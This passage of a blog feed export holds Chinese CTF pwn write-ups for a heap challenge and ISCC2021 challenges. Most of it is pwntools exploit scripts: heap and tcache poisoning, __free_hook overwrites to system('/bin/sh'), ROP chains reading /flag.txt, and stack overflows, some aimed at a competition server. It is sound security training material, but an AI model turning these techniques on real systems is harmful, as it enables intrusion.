class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./babypwn'</span>)</span><br><span class="line">p=process(<span class="string">'./babypwn'</span>)</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text=<span class="string">''</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(str(text))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(v2)</span>:</span></span><br><span class="line">    s=Solver()</span><br><span class="line">    a1=BitVec(<span class="string">'a1'</span>,<span class="number">32</span>) </span><br><span class="line">    t = a1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            a1 ^= (<span class="number">32</span> * a1) ^ (LShR((a1 ^ (<span class="number">32</span> * a1)), <span class="number">17</span>)) ^ (((<span class="number">32</span> * a1) ^ a1 ^ (LShR((a1 ^ (<span class="number">32</span> * a1)), <span class="number">17</span>))) &lt;&lt; <span class="number">13</span>)</span><br><span class="line">    s.add(a1 == int(v2,<span class="number">16</span>))</span><br><span class="line">    s.check()</span><br><span class="line">    ans = int(s.model()[t].as_long())</span><br><span class="line">    print(hex(ans))</span><br><span class="line">    <span class="keyword">return</span> p32(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x88</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">0xf0</span>*<span class="string">'1'</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x11</span>))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x88</span>*<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line">p.recv()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">x=p.recvline()</span><br><span class="line">y=p.recvline()</span><br><span class="line">x=decode(x)</span><br><span class="line">y=x+decode(y)</span><br><span class="line">addr=u64(y)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">main_arena=addr<span class="number">-328</span></span><br><span class="line">malloc=main_arena<span class="number">-0x10</span></span><br><span class="line">log,info(<span class="string">'malloc:'</span>+hex(malloc))</span><br><span class="line">x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc,num=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'yyyyyyy'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">rdi_ret=x.libcbase+<span class="number">0x0000000000025a3b</span></span><br><span class="line">rsi_ret=x.libcbase+<span class="number">0x00000000000263e9</span></span><br><span class="line">rdx_ret=x.libcbase+<span class="number">0x00000000001018c5</span></span><br><span class="line">rbp_ret=x.libcbase+<span class="number">0x000000000004a1a7</span></span><br><span class="line">rax=x.libcbase+<span class="number">0x000000000002606c</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">xx=p.recvline()</span><br><span class="line">y=p.recvline()</span><br><span class="line">xx=decode(xx)</span><br><span class="line">y=xx+decode(y)</span><br><span class="line">addr=u64(y)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">edit(<span class="number">13</span>,p64(x.dump(<span class="string">'setcontext'</span>)+<span class="number">53</span>))</span><br><span class="line">pay=p64(rdi_ret)+p64(<span class="number">0</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'read'</span>))</span><br><span class="line">pay+=p64(rdi_ret)+p64(addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(rdx_ret)+p64(<span class="number">0</span>)+p64(x.dump(<span class="string">'open'</span>))<span class="comment">#open(addr,0,0)</span></span><br><span class="line">pay+=p64(rdi_ret)+p64(<span class="number">3</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'read'</span>))</span><br><span class="line">pay+=p64(rdi_ret)+p64(<span class="number">1</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'write'</span>))</span><br><span class="line">print(len(pay))</span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">15</span>,pay)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'1'</span>*<span class="number">0x10</span>+p64(addr+<span class="number">0x118</span>+<span class="number">0x360</span>)+p64(rdi_ret)+<span class="string">'1'</span>*<span class="number">0x18</span>+<span class="string">'3'</span>*<span class="number">0x40</span>+<span class="string">'22222'</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/flag.txt\x00'</span>)</span><br><span class="line"><span class="comment">#free(10)</span></span><br><span class="line"><span class="comment">#edit(10,'xxxxxxx')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2021 PWN部分 WP</title>
      <link href="/2021/05/28/ISCC2021%20PWN%20WP/"/>
      <url>/2021/05/28/ISCC2021%20PWN%20WP/</url>
      
        <content type="html"><![CDATA[<p>今年终于有机会去体验iscc了，也感受到了什么是pycc的力量了。（人均全栈，233雾）<a id="more"></a></p><h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><p>经典的整数溢出与栈溢出.利用262来整数逃过判断,扩大栈上写入字节造成栈溢出.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./M78'</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'39.96.88.40'</span>,<span class="number">7010</span>)</span><br><span class="line">p.sendline(<span class="string">'1\x00'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please choose a building'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Please input the password'</span>)</span><br><span class="line"></span><br><span class="line">shell=<span class="string">'a'</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(e.symbols[<span class="string">'call_main'</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(shell+<span class="string">'a'</span>*(<span class="number">262</span>-len(shell)))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Box"><a href="#Box" class="headerlink" title="Box"></a>Box</h2><p>old-2.27版的堆题,限制了最多申请6个同种堆块,通过连续二次释放0x90大小的堆块.获得chunk地址.更改tcache 管理结构体,伪造其填满.再释放0x90大小的堆块获得libc基地址.再在<code>__free_hook</code>上写入system 从而getshel。l</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">l=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#l=ELF('/glibc/2.27/amd64/lib/libc.so.6')</span></span><br><span class="line"><span class="comment">#p=process('./pwn')</span></span><br><span class="line">p=remote(<span class="string">'39.96.88.40'</span>,<span class="number">7020</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size,text)</span>:</span></span><br><span class="line"><span class="comment">#p.recvuntil('&gt;&gt; ')</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Input the size:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Input data:'</span>)</span><br><span class="line">p.sendline(text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text)</span>:</span></span><br><span class="line">p.send(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Please input the data:'</span>)</span><br><span class="line">p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Here is it :'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x90</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">chunk_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'chunk_addr:'</span>+hex(chunk_addr))</span><br><span class="line">tache_addr=chunk_addr<span class="number">-0x260</span></span><br><span class="line">log.info(<span class="string">'tache_addr:'</span>+hex(tache_addr))</span><br><span class="line">edit(<span class="number">2</span>,p64(tache_addr+<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(2,0x40,p8(7)*0x10)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>,p8(<span class="number">7</span>)*<span class="number">0x10</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x90</span>,p8(<span class="number">6</span>)*<span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">main_arena_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span></span><br><span class="line">log.info(<span class="string">'main_arena_addr:'</span>+hex(main_arena_addr))</span><br><span class="line">base=main_arena_addr<span class="number">-0x3afc40</span></span><br><span class="line">log.info(<span class="string">'blic_base_addr:'</span>+hex(base))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">edit(<span class="number">4</span>,p8(<span class="number">6</span>)*<span class="number">0x40</span>+p64(base+l.symbols[<span class="string">'__free_hook'</span>])+p64(base+l.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x20</span>,p64(base+l.symbols[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>经典的伪随机数问题，通过<code>from ctypes import *</code>的<code>CDLL</code>本地模拟随机数生成，同时利用栈溢出控制伪随机数种子。从而控制随机数产生。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'./game'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p=remote(<span class="string">'39.96.88.40'</span>,<span class="number">7040</span>)</span><br><span class="line"><span class="comment">#process('./game')</span></span><br><span class="line">c = CDLL(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">c.srand(<span class="number">1</span>) </span><br><span class="line">pay=<span class="string">'a'</span>*(<span class="number">0x24</span>)+p32(<span class="number">2</span>)+p32(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    <span class="comment">#p.recvuntil('point(1~6):')</span></span><br><span class="line">x=c.rand()</span><br><span class="line"><span class="comment">#print(x)</span></span><br><span class="line">c.srand(x)</span><br><span class="line">l=c.rand()%<span class="number">0x64</span>+<span class="number">1</span> </span><br><span class="line">print(l)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">p.sendline(str(l))</span><br><span class="line"><span class="comment">#print(l)</span></span><br><span class="line">print(p.recv())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="full"><a href="#full" class="headerlink" title="full"></a>full</h2><p>由于没有打印信息的函数,且程序PIE是关闭的,通常就会想到ret2dl_resolve。但是做了半天发现不行，看了下保护：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure><p>发现 <code>Full RELRO</code>开着，wro……</p><p>但是查阅资料发现<a href="https://gdufs-king.github.io/2020/01/03/%E7%A5%9E%E5%A5%87%E7%9A%84gadget/" target="_blank" rel="noopener">神奇的gadget</a>一文提供了，将真实地址转移到栈上修改的思路。虽然题目中没有这个gadget但是提供了memcpy 函数。</p><p>有根据在大多数libc中read与write的symbols只一个字节不同的特性，同过将read打印到栈上修改成write从而泄露libc。</p><p>然后不知道为啥system无法执行（菜鸡推测是栈上问题），于是用orw（open-read-write）方法强行读取flag文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.arch=<span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./full'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote('39.96.88.40',7050)</span></span><br><span class="line">p=process(<span class="string">'./full'</span>)</span><br><span class="line">pppr_addr      = <span class="number">0x08048519</span>     <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop_ebp_addr   = <span class="number">0x0804851b</span>     <span class="comment"># pop ebp ; ret</span></span><br><span class="line">leave_ret_addr = <span class="number">0x080483c5</span>     <span class="comment"># leave ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay1=<span class="string">'12cdefghijklmn'</span>+p32(<span class="number">0x0804A040</span>+<span class="number">0x10</span>+<span class="number">0x8</span>)+p8(<span class="number">1</span>)*<span class="number">2</span></span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0x804a240</span>)+p32(<span class="number">0x100</span>)</span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">"memcpy"</span>])+p32(pppr_addr)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x8049ff0</span>)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#栈转移</span></span><br><span class="line"></span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x1</span>)</span><br><span class="line">pay1+=p32(<span class="number">0x08048518</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x41</span>)+p32(<span class="number">0x40</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x08048504</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">8</span>)+<span class="string">'1111'</span>*<span class="number">4</span>+<span class="string">'2222'</span>*<span class="number">4</span></span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">168</span>+<span class="number">0x0804A040</span>)+p32(<span class="number">0x100</span>)</span><br><span class="line">print(len(pay1))<span class="comment">#布局gadget，ret2csu调用write打印真实地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">'/flag.txt\x00\x00'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(p8(<span class="number">0xb0</span>))<span class="comment"># yuancheng  #经过爆破发现将read真实地址改为0xb0恰好是write</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.send(p8(0x90)) #本地</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">print(hex(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write)</span><br><span class="line">libcbase = write - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">system=libcbase+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">read_0=libcbase+libc.dump(<span class="string">'open'</span>)</span><br><span class="line">write_0=libcbase+libc.dump(<span class="string">'write'</span>)</span><br><span class="line">log.info(<span class="string">'libcbase+system:'</span>+hex(system))</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(p32(read_0)+p32(pppr_addr)+p32(<span class="number">0x804a240</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">3</span>)+p32(<span class="number">0x804a440</span>+<span class="number">4</span>)+p32(<span class="number">0x100</span>)+p32(write_0)+<span class="string">'xxxx'</span>+p32(<span class="number">1</span>)+p32(<span class="number">0x804a440</span>+<span class="number">4</span>)+p32(<span class="number">0x100</span>))<span class="comment">#orw操作</span></span><br><span class="line"><span class="comment">#p.sendline()</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.sendline(p32(elf.symbols['read'])+'aaaa'+p32(0)+p32(0x804a240)+p32(0x100))</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl-resolve利用方法小记</title>
      <link href="/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/"/>
      <url>/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/</url>
      
